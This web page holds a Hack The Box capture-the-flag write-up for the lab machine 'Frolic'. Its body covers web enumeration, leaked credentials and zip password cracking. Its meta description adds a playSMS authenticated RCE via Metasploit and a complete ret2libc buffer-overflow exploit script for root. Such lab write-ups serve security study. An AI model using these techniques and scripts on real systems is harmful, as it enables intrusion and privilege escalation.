<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.24.0 by Michael Rose
  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>Hack The Box - Frolic - 0xRick’s Blog</title>
<meta name="description" content="My write-up / walkthrough for Frolic from Hack The Box.">


  <meta name="author" content="0xRick">
  
  <meta property="article:author" content="0xRick">
  


<meta property="og:type" content="article">
<meta property="og:locale" content="en">
<meta property="og:site_name" content="0xRick's Blog">
<meta property="og:title" content="Hack The Box - Frolic">
<meta property="og:url" content="https://0xrick.github.io/hack-the-box/frolic/">


  <meta property="og:description" content="My write-up / walkthrough for Frolic from Hack The Box.">





  <meta name="twitter:site" content="@ahm3d_h3sham">
  <meta name="twitter:title" content="Hack The Box - Frolic">
  <meta name="twitter:description" content="My write-up / walkthrough for Frolic from Hack The Box.">
  <meta name="twitter:url" content="https://0xrick.github.io/hack-the-box/frolic/">

  
    <meta name="twitter:card" content="summary">
    
  

  



  <meta property="article:published_time" content="2019-03-23T07:00:00+02:00">






<link rel="canonical" href="https://0xrick.github.io/hack-the-box/frolic/">




<script type="application/ld+json">
  {
    "@context": "https://schema.org",
    
      "@type": "Person",
      "name": "0xRick",
      "url": "https://0xrick.github.io/"
    
  }
</script>







<!-- end _includes/seo.html -->




<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">
<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css"></noscript>



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--single wide">
    <nav class="skip-links">
  <ul>
    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
  </ul>
</nav>

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
        <a class="site-title" href="/">
          0xRick's Blog
          
        </a>
        <ul class="visible-links">
<li class="masthead__menu-item">
              <a href="/about">About</a>
            </li>
<li class="masthead__menu-item">
              <a href="/categories">Categories</a>
            </li>
<li class="masthead__menu-item">
              <a href="/tags">Tags</a>
            </li>
</ul>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>


    <div class="initial-content">
      



<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      
        <img src="/images/avatar.jpg" alt="0xRick" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">0xRick</h3>
    
    
      <div class="author__bio" itemprop="description">
        

      </div>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      
        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Somewhere between 1's and 0's</span>
        </li>
      

      
        
          
            <li><a href="/" rel="nofollow noopener noreferrer"><i class="fas fa-fw fa-home" aria-hidden="true"></i><span class="label">Home Page</span></a></li>
          
        
          
            <li><a href="https://twitter.com/ahm3d_h3sham" rel="noopener noreferrer" target="_blank"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
          
        
          
            <li><a href="https://github.com/0xRick" rel="noopener noreferrer" target="_blank"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">Github</span></a></li>
          
        
          
            <li><a href="https://www.buymeacoffee.com/VGEfcAqvn" rel="noopener noreferrer" target="_blank"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">buymeacoffee</span></a></li>
          
        
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>
 
  
  </div>


  <article class="page h-entry" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="Hack The Box - Frolic">
    <meta itemprop="description" content='Hack The Box - FrolicQuick SummaryHey guys today frolic retired and here is my write-up about it. This box was more of a CTF challenge than a real world scenario , especially the user part , But it was nice because for root we will exploit a buffer overflow vulnerability. It’s a linux box and its ip is 10.10.10.111 , I added it to /etc/hosts as frolic.htb. Let’s jump right in !NmapAs always we will start with nmap to scan for open ports and services :nmap -sV -sT -sc frolic.htbWe got ssh on port 22 , smb on port 139 and 445 (which is not a usual thing to see on a linux box) and http on port 9999. We will take a look at http first.HTTP Initial EnumerationBy visiting port 9999 we get the welcome page of nginx , so we will use gobuster to enumerate sub directories :=====================================================Gobuster v2.0.0              OJ Reeves (@TheColonial)=====================================================[+] Mode         : dir[+] Url/Domain   : http://frolic.htb:9999/[+] Threads      : 100[+] Wordlist     : /usr/share/wordlists/dirb/common.txt[+] Status codes : 200,204,301,302,307,403[+] Timeout      : 2m0s=====================================================2019/03/22 12:53:58 Starting gobuster=====================================================/.hta (Status: 403)/.htpasswd (Status: 403)/.htaccess (Status: 403)/admin (Status: 301)/backup (Status: 301)/dev (Status: 301)/test (Status: 301)=====================================================We got /admin , /backup , /dev and /test./backup :/dev :We got 403 on /dev , let’s run gobuster again on /dev :=====================================================Gobuster v2.0.0              OJ Reeves (@TheColonial)=====================================================[+] Mode         : dir[+] Url/Domain   : http://frolic.htb:9999/dev/[+] Threads      : 100[+] Wordlist     : /usr/share/wordlists/dirb/common.txt[+] Status codes : 200,204,301,302,307,403[+] Timeout      : 2m0s=====================================================2019/03/22 17:51:41 Starting gobuster=====================================================/.htaccess (Status: 403)/.hta (Status: 403)/.htpasswd (Status: 403)/backup (Status: 301)/test (Status: 200)=====================================================We got /backup and /test/dev/backup :/playsms , Let’s check that :It asks for authentication , we will get back to it later when we find any credentials. So that was for /dev./test :It’s just the phpinfo() page/admin :on /admin there’s an authentication form , and the title is “c’mon i m hackable” :DHacking the “Hackable” formLet’s take a look at the source code :We notice a script called login.js , maybe authentication is handled by that script.login.js :var attempt = 3; // Variable to count number of attempts.// Below function Executes on click of login button.function validate(){var username = document.getElementById("username").value;var password = document.getElementById("password").value;if ( username == "admin" &amp;&amp; password == "superduperlooperpassword_lol"){alert ("Login successfully");window.location = "success.html"; // Redirecting to other page.return false;}else{attempt --;// Decrementing by one.alert("You have left "+attempt+" attempt;");// Disabling fields after 3 attempts.if( attempt == 0){document.getElementById("username").disabled = true;document.getElementById("password").disabled = true;document.getElementById("submit").disabled = true;return false;}}}We got the username and the password : admin : superduperlooperpassword_lol And after we login we find … this :..... ..... ..... .!?!! .?... ..... ..... ...?. ?!.?. ..... ..... ..... ..... ..... ..!.? ..... ..... .!?!! .?... ..... ..?.? !.?.. ..... ..... ....! ..... ..... .!.?. ..... .!?!! .?!!! !!!?. ?!.?! !!!!! !...! ..... ..... .!.!! !!!!! !!!!! !!!.? ..... ..... ..... ..!?! !.?!! !!!!! !!!!! !!!!? .?!.? !!!!! !!!!! !!!!! .?... ..... ..... ....! ?!!.? ..... ..... ..... .?.?! .?... ..... ..... ...!. !!!!! !!.?. ..... .!?!! .?... ...?. ?!.?. ..... ..!.? ..... ..!?! !.?!! !!!!? .?!.? !!!!! !!!!. ?.... ..... ..... ...!? !!.?! !!!!! !!!!! !!!!! ?.?!. ?!!!! !!!!! !!.?. ..... ..... ..... .!?!! .?... ..... ..... ...?. ?!.?. ..... !.... ..... ..!.! !!!!! !.!!! !!... ..... ..... ....! .?... ..... ..... ....! ?!!.? !!!!! !!!!! !!!!! !?.?! .?!!! !!!!! !!!!! !!!!! !!!!! .?... ....! ?!!.? ..... .?.?! .?... ..... ....! .?... ..... ..... ..!?! !.?.. ..... ..... ..?.? !.?.. !.?.. ..... ..!?! !.?.. ..... .?.?! .?... .!.?. ..... .!?!! .?!!! !!!?. ?!.?! !!!!! !!!!! !!... ..... ...!. ?.... ..... !?!!. ?!!!! !!!!? .?!.? !!!!! !!!!! !!!.? ..... ..!?! !.?!! !!!!? .?!.? !!!.! !!!!! !!!!! !!!!! !.... ..... ..... ..... !.!.? ..... ..... .!?!! .?!!! !!!!! !!?.? !.?!! !.?.. ..... ....! ?!!.? ..... ..... ?.?!. ?.... ..... ..... ..!.. ..... ..... .!.?. ..... ...!? !!.?! !!!!! !!?.? !.?!! !!!.? ..... ..!?! !.?!! !!!!? .?!.? !!!!! !!.?. ..... ...!? !!.?. ..... ..?.? !.?.. !.!!! !!!!! !!!!! !!!!! !.?.. ..... ..!?! !.?.. ..... .?.?! .?... .!.?. ..... ..... ..... .!?!! .?!!! !!!!! !!!!! !!!?. ?!.?! !!!!! !!!!! !!.!! !!!!! ..... ..!.! !!!!! !.?.Ook!After searching on google for a long time I found out that this is an esoteric language called Ook!.Read about esoteric languages hereRead about Ook! hereI used an online interpreter for Ook! on a website called dcode.frOutput :Nothing here check /asdiSIAJJ0QWE9JASPlaysms password/asdiSIAJJ0QWE9JAS :UEsDBBQACQAIAMOJN00j/lsUsAAAAGkCAAAJABwAaW5kZXgucGhwVVQJAAOFfKdbhXynW3V4CwABBAAAAAAEAAAAAF5E5hBKn3OyaIopmhuVUPBuC6m/U3PkAkp3GhHcjuWgNOL22Y9r7nrQEopVyJbsK1i6f+BQyOES4baHpOrQu+J4XxPATolb/Y2EU6rqOPKD8uIPkUoyU8cqgwNE0I19kzhkVA5RAmveEMrX4+T7al+fi/kY6ZTAJ3h/Y5DCFt2PdL6yNzVRrAuaigMOlRBrAyw0tdliKb40RrXpBgn/uoTjlurp78cmcTJviFfUnOM5UEsHCCP+WxSwAAAAaQIAAFBLAQIeAxQACQAIAMOJN00j/lsUsAAAAGkCAAAJABgAAAAAAAEAAACkgQAAAABpbmRleC5waHBVVAUAA4V8p1t1eAsAAQQAAAAABAAAAABQSwUGAAAAAAEAAQBPAAAAAwEAAAAA Obviously it’s base64 , so I copied it and saved it in a txt file to decode it :We got a weird output , let’s redirect the output into a file and check what kind of files is that :It’s a zip archive , let’s unzip it :Password protected. There’s a tool called fcrackzip we can use it to bruteforce the password :fcrackzip file.zip -u -D -p /usr/share/wordlists/rockyou.txtThe password is “password” !After extraction we get a file called index.php :4b7973724b7973674b7973724b7973675779302b4b7973674b7973724b7973674b79737250463067506973724b7973674b7934744c5330674c5330754b7973674b7973724b7973674c6a77720d0a4b7973675779302b4b7973674b7a78645069734b4b797375504373674b7974624c5434674c53307450463067506930744c5330674c5330754c5330674c5330744c5330674c6a77724b7973670d0a4b317374506973674b79737250463067506973724b793467504373724b3173674c5434744c53304b5046302b4c5330674c6a77724b7973675779302b4b7973674b7a7864506973674c6930740d0a4c533467504373724b3173674c5434744c5330675046302b4c5330674c5330744c533467504373724b7973675779302b4b7973674b7973385854344b4b7973754c6a776743673d3d0d0aHex encoded , let’s decode it. I will use a website called CyberChef :Base64 encoded output , let’s decode one more time :Another esoteric language. But this time it’s a famous one , brainfuck. We will use dcode.fr again :Output :idkwhatispassLet’s try to login to playsms as admin with this password :And it worked.Exploiting Authenticated RCE and getting userThere are some known vulnerabilities for playsms , one of them is an Authenticated CSV File Upload Code Execution (CVE-2017-9101). There’s also a metasploit module for it.The exploit worked and we have a meterpreter session now :We owned user !Buffer Overflow in ropIn the home directory of the user ayush there’s a directory called .binary , which has a binary called rop. we can verify that rop is suid by using find:find /home/ayush/.binary/ -perm -4000Let’s see what is it doing :So it takes our input and just ouputs it , Let’s try giving it a long string :We got a segmentation fault , so we have a buffer overflow. I will go through the exploitation without explaining everything because I have already written some posts about buffer overflow. You can check them hereWe are going to do a ret2libc attack , if you are unfamiliar with it , you can read my post about it hereFirst of all , gdb is not installed on the box :So I download a static version of gdb from github , and uploaded it to the box through the meterpreter session. upload gdbLet’s find the length of the buffer :So the buffer overflows after 52 chars. Now we need to know the address of /bin/sh , I won’t do it like I did before by loading the string in a environment variable. There’s a better way to do it, first thing we need to find the offset of /bin/sh in libc , we will use strings to get the address :strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/shOffset : 0x0015ba0bThen we need the address of libc , we can use ldd to get it :ldd ropAddress : 0xb7e19000Then we will add the two addresses to get the address of /bin/shAddress of /bin/sh : 0x0015ba0b + 0xb7e19000 = 0xb7f74a0bNow we need the addresses of system() and exit() :Address of system() : 0xb7e53da0Address of exit() : 0xb7e479d0Our final exploit will be:#!/usr/bin/pythonimport structbuf = "A" * 52system = struct.pack("I" ,0xb7e53da0)exit = struct.pack("I" ,0xb7e479d0)shell = struct.pack("I" ,0xb7f74a0b)print buf + system + exit + shellLet’s upload and run it :./rop `python /tmp/exploit.py`And we owned root !That’s it , Feedback is appreciated !Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it , follow on twitter @Ahm3d_H3shamThanks for reading.Previous Hack The Box write-up : Hack The Box - CarrierNext Hack The Box write-up : Hack The Box - Curling'>
    <meta itemprop="datePublished" content="2019-03-23T07:00:00+02:00">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title p-name" itemprop="headline">
            <a href="https://0xrick.github.io/hack-the-box/frolic/" class="u-url" itemprop="url">Hack The Box - Frolic
</a>
          </h1>
          

  <p class="page__meta">
    
      
      <span class="page__meta-date">
        <i class="far fa-calendar-alt" aria-hidden="true"></i>
        
        <time datetime="2019-03-23T07:00:00+02:00">March 23, 2019</time>
      </span>
    

    <span class="page__meta-sep"></span>

    
      
      

      <span class="page__meta-readtime">
        <i class="far fa-clock" aria-hidden="true"></i>
        
          6 minute read
        
      </span>
    
  </p>


        </header>
      

      <section class="page__content e-content" itemprop="text">
        <div>
          <style>
              #carbonads {
                border: 1px solid black;
                border-radius: 7px;
                border-spacing: 7px;
                display: block;
                overflow: hidden;
                padding: 1em;
                line-height: 1.5;
              }
              #carbonads span {
                position: relative;
                display: block;
                overflow: hidden;
              }
              .carbon-img img {
                display: block;
                float: left;
              }
              .carbon-text {
                display: block;
                font-size: .9em;
                text-align: end;
              }
              .carbon-poweredby {
                display: block;
                font-size: .8em;
                float: right;
                line-height: 1;
                letter-spacing: 1px;
                }
                </style>
                <br>   
          <script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&amp;placement=0xrickgithubio" id="_carbonads_js"></script> 
                <br>
        </div>
        
          <aside class="sidebar__right ">
            <nav class="toc">
              <header><h4 class="nav__title">
<i class="fas fa-file-alt"></i> Contents</h4></header>
              <ul class="toc__menu"><li>
<a href="#hack-the-box---frolic">Hack The Box - Frolic</a><ul>
<li><a href="#quick-summary">Quick Summary</a></li>
<li><a href="#nmap">Nmap</a></li>
<li><a href="#http-initial-enumeration">HTTP Initial Enumeration</a></li>
<li><a href="#hacking-the-hackable-form">Hacking the “Hackable” form</a></li>
<li><a href="#ook">Ook!</a></li>
<li><a href="#playsms-password">Playsms password</a></li>
<li><a href="#exploiting-authenticated-rce-and-getting-user">Exploiting Authenticated RCE and getting user</a></li>
<li><a href="#buffer-overflow-in-rop">Buffer Overflow in rop</a></li>
</ul>
</li></ul>

            </nav>
          </aside>
        
        <h1 id="hack-the-box---frolic">Hack The Box - Frolic</h1>

<h2 id="quick-summary">Quick Summary</h2>
<p>Hey guys today frolic retired and here is my write-up about it. This box was more of a CTF challenge than a real world scenario , especially the user part , But it was nice because for root we will exploit a buffer overflow vulnerability. It’s a linux box and its ip is <code class="language-plaintext highlighter-rouge">10.10.10.111</code> , I added it to <code class="language-plaintext highlighter-rouge">/etc/hosts</code> as <code class="language-plaintext highlighter-rouge">frolic.htb</code>. Let’s jump right in !
<br><img src="/images/hackthebox/frolic/0.png" alt="" class="align-center"><br><br></p>

<h2 id="nmap">Nmap</h2>
<p>As always we will start with nmap to scan for open ports and services :
<code class="language-plaintext highlighter-rouge">nmap -sV -sT -sc frolic.htb</code>
<br><img src="/images/hackthebox/frolic/1.png" alt="" class="align-center"><br><br>
We got ssh on port 22 , smb on port 139 and 445 (which is not a usual thing to see on a linux box) and http on port 9999. We will take a look at http first.<br></p>

<h2 id="http-initial-enumeration">HTTP Initial Enumeration</h2>
<p><br><img src="/images/hackthebox/frolic/2.png" alt="" class="align-center"><br><br>
By visiting port 9999 we get the welcome page of nginx , so we will use gobuster to enumerate sub directories :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://frolic.htb:9999/
[+] Threads      : 100
[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 2m0s
=====================================================
2019/03/22 12:53:58 Starting gobuster
=====================================================
/.hta (Status: 403)
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/admin (Status: 301)
/backup (Status: 301)
/dev (Status: 301)
/test (Status: 301)
=====================================================
</code></pre></div></div>
<p>We got <code class="language-plaintext highlighter-rouge">/admin</code> , <code class="language-plaintext highlighter-rouge">/backup</code> , <code class="language-plaintext highlighter-rouge">/dev</code> and <code class="language-plaintext highlighter-rouge">/test</code>.<br>
<code class="language-plaintext highlighter-rouge">/backup</code> :
<br><img src="/images/hackthebox/frolic/3.png" alt="" class="align-center"><br><br>
<code class="language-plaintext highlighter-rouge">/dev</code> :
<br><img src="/images/hackthebox/frolic/4.png" alt="" class="align-center"><br><br>
We got <code class="language-plaintext highlighter-rouge">403</code> on <code class="language-plaintext highlighter-rouge">/dev</code> , let’s run gobuster again on <code class="language-plaintext highlighter-rouge">/dev</code> :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://frolic.htb:9999/dev/
[+] Threads      : 100
[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 2m0s
=====================================================
2019/03/22 17:51:41 Starting gobuster
=====================================================
/.htaccess (Status: 403)
/.hta (Status: 403)
/.htpasswd (Status: 403)
/backup (Status: 301)
/test (Status: 200)
=====================================================
</code></pre></div></div>
<p>We got <code class="language-plaintext highlighter-rouge">/backup</code> and <code class="language-plaintext highlighter-rouge">/test</code>
<code class="language-plaintext highlighter-rouge">/dev/backup</code> :
<br><img src="/images/hackthebox/frolic/5.png" alt="" class="align-center"><br><br>
<code class="language-plaintext highlighter-rouge">/playsms</code> , Let’s check that :
<br><img src="/images/hackthebox/frolic/6.png" alt="" class="align-center"><br><br>
It asks for authentication , we will get back to it later when we find any credentials. So that was for <code class="language-plaintext highlighter-rouge">/dev</code>.<br>
<code class="language-plaintext highlighter-rouge">/test</code> :
<br><img src="/images/hackthebox/frolic/7.png" alt="" class="align-center"><br><br>
It’s just the <code class="language-plaintext highlighter-rouge">phpinfo()</code> page
<code class="language-plaintext highlighter-rouge">/admin</code> :
<br><img src="/images/hackthebox/frolic/8.png" alt="" class="align-center"><br><br>
on <code class="language-plaintext highlighter-rouge">/admin</code> there’s an authentication form , and the title is “c’mon i m hackable” :D</p>

<h2 id="hacking-the-hackable-form">Hacking the “Hackable” form</h2>
<p>Let’s take a look at the source code :
<br><img src="/images/hackthebox/frolic/9.png" alt="" class="align-center"><br><br>
We notice a script called <code class="language-plaintext highlighter-rouge">login.js</code> , maybe authentication is handled by that script.<br>
<code class="language-plaintext highlighter-rouge">login.js</code> :</p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">attempt</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span> <span class="c1">// Variable to count number of attempts.</span>
<span class="c1">// Below function Executes on click of login button.</span>
<span class="kd">function</span> <span class="nx">validate</span><span class="p">(){</span>
<span class="kd">var</span> <span class="nx">username</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">username</span><span class="dl">"</span><span class="p">).</span><span class="nx">value</span><span class="p">;</span>
<span class="kd">var</span> <span class="nx">password</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">password</span><span class="dl">"</span><span class="p">).</span><span class="nx">value</span><span class="p">;</span>
<span class="k">if</span> <span class="p">(</span> <span class="nx">username</span> <span class="o">==</span> <span class="dl">"</span><span class="s2">admin</span><span class="dl">"</span> <span class="o">&amp;&amp;</span> <span class="nx">password</span> <span class="o">==</span> <span class="dl">"</span><span class="s2">superduperlooperpassword_lol</span><span class="dl">"</span><span class="p">){</span>
<span class="nx">alert</span> <span class="p">(</span><span class="dl">"</span><span class="s2">Login successfully</span><span class="dl">"</span><span class="p">);</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">location</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">success.html</span><span class="dl">"</span><span class="p">;</span> <span class="c1">// Redirecting to other page.</span>
<span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
<span class="p">}</span>
<span class="k">else</span><span class="p">{</span>
<span class="nx">attempt</span> <span class="o">--</span><span class="p">;</span><span class="c1">// Decrementing by one.</span>
<span class="nx">alert</span><span class="p">(</span><span class="dl">"</span><span class="s2">You have left </span><span class="dl">"</span><span class="o">+</span><span class="nx">attempt</span><span class="o">+</span><span class="dl">"</span><span class="s2"> attempt;</span><span class="dl">"</span><span class="p">);</span>
<span class="c1">// Disabling fields after 3 attempts.</span>
<span class="k">if</span><span class="p">(</span> <span class="nx">attempt</span> <span class="o">==</span> <span class="mi">0</span><span class="p">){</span>
<span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">username</span><span class="dl">"</span><span class="p">).</span><span class="nx">disabled</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
<span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">password</span><span class="dl">"</span><span class="p">).</span><span class="nx">disabled</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
<span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">submit</span><span class="dl">"</span><span class="p">).</span><span class="nx">disabled</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
<span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
<span class="p">}</span>
<span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>
<p><br><img src="/images/hackthebox/frolic/10.png" alt="" class="align-center"><br><br>
We got the username and the password : <code class="language-plaintext highlighter-rouge">admin : superduperlooperpassword_lol</code> 
<br><img src="/images/hackthebox/frolic/11.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/frolic/12.png" alt="" class="align-center"><br><br>
And after we login we find … this :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>..... ..... ..... .!?!! .?... ..... ..... ...?. ?!.?. ..... ..... ..... ..... ..... ..!.? ..... ..... .!?!! .?... ..... ..?.? !.?.. ..... ..... ....! ..... ..... .!.?. ..... .!?!! .?!!! !!!?. ?!.?! !!!!! !...! ..... ..... .!.!! !!!!! !!!!! !!!.? ..... ..... ..... ..!?! !.?!! !!!!! !!!!! !!!!? .?!.? !!!!! !!!!! !!!!! .?... ..... ..... ....! ?!!.? ..... ..... ..... .?.?! .?... ..... ..... ...!. !!!!! !!.?. ..... .!?!! .?... ...?. ?!.?. ..... ..!.? ..... ..!?! !.?!! !!!!? .?!.? !!!!! !!!!. ?.... ..... ..... ...!? !!.?! !!!!! !!!!! !!!!! ?.?!. ?!!!! !!!!! !!.?. ..... ..... ..... .!?!! .?... ..... ..... ...?. ?!.?. ..... !.... ..... ..!.! !!!!! !.!!! !!... ..... ..... ....! .?... ..... ..... ....! ?!!.? !!!!! !!!!! !!!!! !?.?! .?!!! !!!!! !!!!! !!!!! !!!!! .?... ....! ?!!.? ..... .?.?! .?... ..... ....! .?... ..... ..... ..!?! !.?.. ..... ..... ..?.? !.?.. !.?.. ..... ..!?! !.?.. ..... .?.?! .?... .!.?. ..... .!?!! .?!!! !!!?. ?!.?! !!!!! !!!!! !!... ..... ...!. ?.... ..... !?!!. ?!!!! !!!!? .?!.? !!!!! !!!!! !!!.? ..... ..!?! !.?!! !!!!? .?!.? !!!.! !!!!! !!!!! !!!!! !.... ..... ..... ..... !.!.? ..... ..... .!?!! .?!!! !!!!! !!?.? !.?!! !.?.. ..... ....! ?!!.? ..... ..... ?.?!. ?.... ..... ..... ..!.. ..... ..... .!.?. ..... ...!? !!.?! !!!!! !!?.? !.?!! !!!.? ..... ..!?! !.?!! !!!!? .?!.? !!!!! !!.?. ..... ...!? !!.?. ..... ..?.? !.?.. !.!!! !!!!! !!!!! !!!!! !.?.. ..... ..!?! !.?.. ..... .?.?! .?... .!.?. ..... ..... ..... .!?!! .?!!! !!!!! !!!!! !!!?. ?!.?! !!!!! !!!!! !!.!! !!!!! ..... ..!.! !!!!! !.?.

</code></pre></div></div>
<p><br><img src="/images/hackthebox/frolic/13.png" alt="" class="align-center"><br><br></p>

<h2 id="ook">Ook!</h2>
<p>After searching on google for a long time I found out that this is an esoteric language called <code class="language-plaintext highlighter-rouge">Ook!</code>.<br>
Read about esoteric languages <a href="https://esolangs.org/wiki/Main_Page" target="_blank" rel="noopener noreferrer">here</a>
Read about <code class="language-plaintext highlighter-rouge">Ook!</code> <a href="https://esolangs.org/wiki/Ook!" target="_blank" rel="noopener noreferrer">here</a>
I used an <a href="https://www.dcode.fr/ook-language" target="_blank" rel="noopener noreferrer">online interpreter</a> for <code class="language-plaintext highlighter-rouge">Ook!</code> on a website called <a href="https://www.dcode.fr/" target="_blank" rel="noopener noreferrer">dcode.fr</a>
<br><img src="/images/hackthebox/frolic/14.png" alt="" class="align-center"><br><br>
Output :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Nothing here check /asdiSIAJJ0QWE9JAS
</code></pre></div></div>
<p><br><img src="/images/hackthebox/frolic/15.png" alt="" class="align-center"><br><br></p>

<h2 id="playsms-password">Playsms password</h2>
<p><code class="language-plaintext highlighter-rouge">/asdiSIAJJ0QWE9JAS</code> :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>UEsDBBQACQAIAMOJN00j/lsUsAAAAGkCAAAJABwAaW5kZXgucGhwVVQJAAOFfKdbhXynW3V4CwABBAAAAAAEAAAAAF5E5hBKn3OyaIopmhuVUPBuC6m/U3PkAkp3GhHcjuWgNOL22Y9r7nrQEopVyJbsK1i6f+BQyOES4baHpOrQu+J4XxPATolb/Y2EU6rqOPKD8uIPkUoyU8cqgwNE0I19kzhkVA5RAmveEMrX4+T7al+fi/kY6ZTAJ3h/Y5DCFt2PdL6yNzVRrAuaigMOlRBrAyw0tdliKb40RrXpBgn/uoTjlurp78cmcTJviFfUnOM5UEsHCCP+WxSwAAAAaQIAAFBLAQIeAxQACQAIAMOJN00j/lsUsAAAAGkCAAAJABgAAAAAAAEAAACkgQAAAABpbmRleC5waHBVVAUAA4V8p1t1eAsAAQQAAAAABAAAAABQSwUGAAAAAAEAAQBPAAAAAwEAAAAA 

</code></pre></div></div>
<p><br><img src="/images/hackthebox/frolic/16.png" alt="" class="align-center"><br><br>
Obviously it’s base64 , so I copied it and saved it in a <code class="language-plaintext highlighter-rouge">txt</code> file to decode it :
<br><img src="/images/hackthebox/frolic/17.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/frolic/18.png" alt="" class="align-center"><br><br>
We got a weird output , let’s redirect the output into a file and check what kind of files is that :
<br><img src="/images/hackthebox/frolic/19.png" alt="" class="align-center"><br><br>
It’s a zip archive , let’s unzip it :
<br><img src="/images/hackthebox/frolic/20.png" alt="" class="align-center"><br><br>
Password protected. There’s a tool called <code class="language-plaintext highlighter-rouge">fcrackzip</code> we can use it to bruteforce the password :
<code class="language-plaintext highlighter-rouge">fcrackzip file.zip -u -D -p /usr/share/wordlists/rockyou.txt</code>
The password is “password” !
After extraction we get a file called <code class="language-plaintext highlighter-rouge">index.php</code> :</p>
